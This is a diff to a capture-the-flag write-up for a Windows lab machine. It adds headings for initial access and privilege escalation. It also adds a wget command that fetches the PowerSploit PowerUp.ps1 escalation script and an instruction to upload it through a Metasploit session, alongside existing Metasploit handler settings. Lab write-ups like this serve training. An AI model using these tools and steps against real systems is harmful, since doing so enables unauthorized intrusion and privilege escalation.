@@ -26,7 +26,7 @@ Q1. Who is the employee of the month?
 (Hint: Reverse the image)
 Answer:
 ![emp img](scrshots/emp.png)
-
+## Initial Access
 **Q2.** Scan the machine with nmap. What is the other port running a web server on?
 - **Answer:** 8080
 
@@ -48,5 +48,15 @@ Answer:
   set rport <Target Port>
   set lhost tun0
   run
-![emp img](scrshots/ini.png)
+![emp img](scrshots/initial.png)
+![emp img](scrshots/user.png)
+
+## Privilege Escalation
+To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
+```bash
+  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+```
+![emp img](scrshots/powerup.png)
+**Now you can use the upload command in Metasploit to upload the script.**
+
   
